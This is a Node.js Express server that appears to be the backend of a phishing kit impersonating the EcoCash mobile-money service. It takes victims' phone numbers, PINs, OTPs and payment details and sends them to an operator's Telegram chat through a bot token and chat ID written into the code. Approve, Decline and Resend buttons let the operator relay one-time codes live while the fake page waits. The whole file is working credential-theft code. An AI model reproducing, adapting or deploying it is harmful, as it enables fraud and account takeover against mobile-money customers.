const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3005;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8936298383:AAGUnZanytc5tEUE5ruyMjOzxR6-6hPjbR0';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8392790531';
const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SESSION_TTL_MS     = 60 * 60 * 1000;

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));

const sessions = new Map();

function createSession(stage, meta){
  const id = 's_' + Date.now().toString(36) + Math.random().toString(36).slice(2,8);
  const now = Date.now();
  sessions.set(id, { id, stage, meta, status:'pending', createdAt:now, expiresAt: now + SESSION_TTL_MS });
  return sessions.get(id);
}
function getSession(id){
  const s = sessions.get(id);
  if(!s) return null;
  if(Date.now() > s.expiresAt && s.status === 'pending') s.status = 'expired';
  return s;
}
setInterval(()=>{
  const now = Date.now();
  for(const [id,s] of sessions){ if(now > s.expiresAt + 60000) sessions.delete(id); }
}, 5*60*1000);

async function tgSend(text, replyMarkup){
  const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode:'Markdown' };
  if(replyMarkup) body.reply_markup = replyMarkup;
  const r = await fetch(`${TELEGRAM_API}/sendMessage`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify(body)
  });
  return r.json();
}
async function tgAnswer(cbId, text){
  await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ callback_query_id: cbId, text })
  }).catch(()=>{});
}
async function tgRemoveButtons(chatId, messageId){
  await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
  }).catch(()=>{});
}

app.post('/api/notify', async (req, res)=>{
  try{
    const { stage, phone, pinOrOtp, receipt } = req.body || {};
    if(!stage || !['pin','otp'].includes(stage)) return res.status(400).json({ ok:false, error:'Invalid stage' });

    const s = createSession(stage, { phone, receipt });
    const label = stage === 'pin' ? '🔐 PIN Captured' : '📩 OTP Captured';
    const keyLabel = stage === 'pin' ? 'PIN' : 'OTP';

    const text =
      `${label}\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 Ref: ${receipt?.trackingNumber || '—'}\n` +
      `👤 ${receipt?.accountName || '—'}\n` +
      `📱 ${phone || '—'}\n` +
      `🔑 ${keyLabel}: \`${pinOrOtp || '—'}\`\n` +
      `💳 ${receipt?.modeOfPayment || '—'}\n` +
      `💰 ${receipt?.currency || ''} ${receipt?.amount || '—'}\n` +
      `🕒 ${new Date().toLocaleString('en-GB',{timeZone:'Africa/Harare'})} CAT\n` +
      `\n_Session: ${s.id}_`;

    const buttons = stage === 'pin' ? {
      inline_keyboard: [[
        { text:'✅ Approve', callback_data:`approve:${s.id}` },
        { text:'❌ Decline', callback_data:`decline:${s.id}` }
      ]]
    } : {
      inline_keyboard: [[
        { text:'✅ Approve', callback_data:`approve:${s.id}` },
        { text:'🔁 Resend',  callback_data:`resend:${s.id}` }
      ]]
    };

    const tg = await tgSend(text, buttons);
    if(!tg.ok){
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok:false, error: tg.description });
    }
    return res.json({ ok:true, sessionId: s.id });
  }catch(err){
    console.error('notify error:', err);
    return res.status(500).json({ ok:false, error: err.message });
  }
});

app.get('/api/status/:id', (req,res)=>{
  const s = getSession(req.params.id);
  if(!s) return res.status(404).json({ ok:false, error:'Session not found' });
  return res.json({ ok:true, status:s.status, stage:s.stage });
});

app.post('/api/telegram-webhook', async (req,res)=>{
  try{
    const update = req.body || {};
    const cq = update.callback_query;
    if(cq && cq.data){
      const [action, sessionId] = cq.data.split(':');
      const s = getSession(sessionId);
      if(!s){ await tgAnswer(cq.id,'Session expired'); return res.json({ ok:true }); }
      if(s.status !== 'pending'){ await tgAnswer(cq.id, `Already ${s.status}`); return res.json({ ok:true }); }
      if(action === 'approve'){ s.status = 'approved'; await tgAnswer(cq.id,'✅ Approved'); }
      else if(action === 'decline'){ s.status = 'declined'; await tgAnswer(cq.id,'❌ Declined'); }
      else if(action === 'resend'){ s.status = 'resend'; await tgAnswer(cq.id,'🔁 Resend'); }
      else { await tgAnswer(cq.id,'Unknown action'); }
      if(cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
    }
    return res.json({ ok:true });
  }catch(err){
    console.error('webhook error:', err);
    return res.status(500).json({ ok:false, error: err.message });
  }
});

app.get('/health', (_req,res)=> res.json({ ok:true, ts: Date.now() }));

app.listen(PORT, async ()=>{
  console.log(`EcoCash server running on port ${PORT}`);
  const publicUrl = process.env.PUBLIC_URL || `http://localhost:${PORT}`;
  try{
    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(publicUrl + '/api/telegram-webhook')}`);
    const d = await r.json();
    console.log('setWebhook:', d);
  }catch(e){ console.error('setWebhook failed:', e.message); }
});
